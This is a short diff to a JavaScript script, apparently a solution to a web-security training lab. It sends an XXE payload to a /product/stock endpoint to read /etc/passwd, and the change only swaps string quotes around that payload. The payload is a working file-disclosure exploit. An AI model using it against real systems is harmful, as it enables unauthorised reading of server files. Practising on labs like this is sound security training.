@@ -39,7 +39,7 @@ async function main() {
    *   <storeId>2</storeId>
    * </stockCheck>
    */
-  const xxe = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>`
+  const xxe = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>'
 
   try {
     await axios.post(`${labUrl}/product/stock`, xxe, {
